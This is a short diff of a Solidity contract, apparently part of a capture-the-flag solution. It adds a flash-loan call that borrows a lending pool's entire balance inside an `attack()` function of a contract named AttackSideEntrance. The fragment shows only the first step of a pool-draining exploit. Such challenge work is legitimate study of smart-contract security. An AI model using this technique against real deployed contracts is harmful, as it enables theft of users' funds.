@@ -6,6 +6,7 @@
  contract AttackSideEntrance {
     SideEntranceLenderPool pool;
     function attack() external {
-    
+        pool.flashLoan(address(pool).balance);
+        
     }
  }
